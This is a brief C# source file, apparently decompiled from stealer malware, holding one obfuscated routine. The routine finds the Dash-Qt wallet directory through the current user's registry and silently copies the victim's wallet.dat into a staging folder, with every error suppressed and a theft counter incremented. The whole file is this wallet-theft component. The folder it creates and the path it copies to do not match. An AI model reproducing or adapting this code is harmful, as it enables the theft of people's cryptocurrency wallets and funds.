using Microsoft.Win32;
using System.IO;

internal class at
{
	public static void a(string jo)
	{
		try
		{
			using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Dash").OpenSubKey("Dash-Qt"))
			{
				try
				{
					Directory.CreateDirectory(jo + "\\Wallets\\DashCore\\");
					File.Copy(registryKey.GetValue("strDataDir").ToString() + "\\wallet.dat", jo + "\\DashCore\\wallet.dat");
					ba.a++;
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
	}
}
